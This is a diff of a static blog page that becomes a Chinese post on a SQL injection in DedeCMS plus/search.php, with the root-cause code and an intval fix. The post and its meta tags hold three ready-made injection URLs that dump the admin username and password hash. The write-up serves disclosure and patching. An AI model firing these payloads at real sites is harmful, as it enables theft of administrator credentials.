@@ -102,7 +102,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="fengxuan 安全" />
+  <meta name="keywords" content="dedecms,php,sql injection," />
 
 
 
@@ -118,16 +118,20 @@
 
 
 
-<meta name="description" content="风炫的博客，专注渗透，编程">
-<meta property="og:type" content="website">
-<meta property="og:title" content="fengxuan&#39;s blog">
-<meta property="og:url" content="http://www.evalshell.com/tags/dedecms/index.html">
+<meta name="description" content="#dedecms plus/search.php 注入漏洞 ##利用(poc) 如果plus/search.php页面报错Safe Alert: Request Error step 2 ! 则使用下面的poc： /plus/search.php?keyword=as&amp;amp;typeArr[111%3D@`&amp;apos;`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,us">
+<meta name="keywords" content="dedecms,php,sql injection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dede_search">
+<meta property="og:url" content="http://www.evalshell.com/2017/08/14/dede-search/index.html">
 <meta property="og:site_name" content="fengxuan&#39;s blog">
-<meta property="og:description" content="风炫的博客，专注渗透，编程">
+<meta property="og:description" content="#dedecms plus/search.php 注入漏洞 ##利用(poc) 如果plus/search.php页面报错Safe Alert: Request Error step 2 ! 则使用下面的poc： /plus/search.php?keyword=as&amp;amp;typeArr[111%3D@`&amp;apos;`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,us">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.evalshell.com/uploads/images/dedecms_search_sqli.png">
+<meta property="og:updated_time" content="2017-08-15T16:47:23.482Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="fengxuan&#39;s blog">
-<meta name="twitter:description" content="风炫的博客，专注渗透，编程">
+<meta name="twitter:title" content="dede_search">
+<meta name="twitter:description" content="#dedecms plus/search.php 注入漏洞 ##利用(poc) 如果plus/search.php页面报错Safe Alert: Request Error step 2 ! 则使用下面的poc： /plus/search.php?keyword=as&amp;amp;typeArr[111%3D@`&amp;apos;`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,us">
+<meta name="twitter:image" content="http://www.evalshell.com/uploads/images/dedecms_search_sqli.png">
 
 
 
@@ -156,13 +160,13 @@
 
 
 
-  <link rel="canonical" href="http://www.evalshell.com/tags/dedecms/"/>
+  <link rel="canonical" href="http://www.evalshell.com/2017/08/14/dede-search/"/>
 
 
 
 
 
-  <title>标签: dedecms | fengxuan's blog</title>
+  <title>dede_search | fengxuan's blog</title>
   
 
 
@@ -191,7 +195,7 @@
     
   
 
-  <div class="container sidebar-position-right  ">
+  <div class="container sidebar-position-right page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -295,82 +299,230 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>dedecms<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.evalshell.com/2017/08/14/dede-search/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="fengxuan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/9276329?v=4&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fengxuan's blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2017/08/14/dede-search/" itemprop="url">
-              
-                <span itemprop="name">dede_search</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">dede_search</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-08-14T22:39:32+08:00"
-              content="2017-08-14" >
-          08-14
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-14T22:39:32+08:00">
+                2017-08-14
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dedecms/" itemprop="url" rel="index">
+                    <span itemprop="name">dedecms</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/08/14/dede-search/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/08/14/dede-search/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
+      
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+      
+        <p>#dedecms plus/search.php 注入漏洞</p>
+<p>##利用(poc)</p>
+<p>如果plus/search.php页面报错<code>Safe Alert: Request Error step 2 !</code> 则使用下面的poc：</p>
+<pre><code>/plus/search.php?keyword=as&amp;typeArr[111%3D@`&apos;`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`&apos;`+]=a
+</code></pre><p>如果提示<code>Safe Alert: Request Error step 1 !</code> 则使用</p>
+<pre><code>/plus/search.php?keyword=as&amp;typeArr[111%3D@`&apos;`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`&apos;`+]=a
+</code></pre><p><strong>注意，我测试上面的都是不能直接使用的</strong></p>
+<p>经过fuzz，得出poc为</p>
+<pre><code>plus/search.php?keyword=as&amp;typeArr[1&apos;+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`&apos;`+]=a
+</code></pre><p>这样是需要重复的键值来触发报错。</p>
+<p>如图：</p>
+<p><img src="/uploads/images/dedecms_search_sqli.png" alt=""></p>
+<p>##漏洞原理</p>
+<p>dedecms有全局变量注册，所以在<code>require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);</code> 这个引用之后都会存在变量覆盖的危险。</p>
+<pre><code>require_once($typenameCacheFile);
+if(isset($typeArr) &amp;&amp; is_array($typeArr))
+{
+    // print_r($typeArr);
+    foreach($typeArr as $id=&gt;$typename)
+    {
+        $keywordn = str_replace($typename, &apos; &apos;, $keyword);
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/08/07/new-atrlcle/" itemprop="url">
-              
-                <span itemprop="name">new atrlcle</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-08-07T11:44:13+08:00"
-              content="2017-08-07" >
-          08-07
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+        if($keyword != $keywordn)
+        {
+            $keyword = $keywordn;
+            $typeid = $id;
+            break;
+        }
+    }
+}
+</code></pre><p>search.php 中第53-68行，遍历了<code>$typeArr</code>的键值，把其坐标赋值给<code>$typeid</code>。<br>这个<code>$typeid</code>最终带入到<code>include/typelink.class.php</code>第52行</p>
+<pre><code>$query = &quot;SELECT tp.*,ch.typename as ctypename,ch.addtable,ch.issystem     FROM `#@__arctype` tp left join `#@__channeltype` ch
+    on ch.id=tp.channeltype  WHERE tp.id=&apos;$typeid&apos; &quot;;
+</code></pre><p>造成注入。</p>
+<p>##修复方案(repair)</p>
+<p><code>$typeid = $id;</code> 改为 <code>$typeid = intval($id);</code>即可</p>
+<p>##参考链接(link)</p>
+<p><a href="https://www.unhonker.com/bug/907.html" target="_blank" rel="external">https://www.unhonker.com/bug/907.html</a></p>
+<p><a href="http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/" target="_blank" rel="external">http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/</a></p>
 
       
     </div>
+    
+    
+    
 
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="/uploads/gzh.jpg" alt="fengxuan wechat" style="width: 200px; max-width: 100%;"/>
+    <div>欢迎您扫一扫上面的微信公众号，订阅我的博客！</div>
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/dedecms/" rel="tag"># dedecms</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/sql-injection/" rel="tag"># sql injection</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/13/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -378,6 +530,17 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -600,10 +763,10 @@
 
 
   
-    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
 
-  
+
 
   
 
@@ -621,6 +784,18 @@
       <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
     
 
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://www.evalshell.com/2017/08/14/dede-search/';
+          this.page.identifier = '2017/08/14/dede-search/';
+          this.page.title = 'dede_search';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
     
 
   
